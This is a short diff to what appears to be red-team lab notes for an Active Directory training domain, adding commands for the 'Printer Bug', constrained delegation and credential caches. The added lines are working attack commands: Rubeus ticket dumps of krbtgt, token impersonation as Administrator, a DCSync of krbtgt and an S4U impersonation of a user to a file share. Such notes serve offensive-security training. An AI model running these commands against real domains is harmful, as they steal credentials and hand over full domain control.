@@ -220,10 +220,17 @@ Rubeus ptt /luid:0x21d8e17 /ticket:[...snip...]
 ImpersonateProcess 2768
 
 The "Printer Bug"
+Assembly /assemblyname:"Rubeus" /parameters:"dump /service:krbtgt"
+MakeToken Administrator CYBER DoesNotMatter
+DCSync CYBER\krbtgt
 
+Constrained Delegation
+PowerShell Get-DomainComputer -TrustedToAuth -Properties DnsHostName, MSDS-AllowedToDelegateTo
+Rubeus dump /service:krbtgt
+Rubeus s4u /impersonateuser:n.glover /msdsspn:cifs/fs-1.cyberbotic.io /ticket:[...snip...]
+Rubeus createnetonly /program:C:\Windows\System32\cmd.exe
 
-
-
+Credential Cache
 
 
 
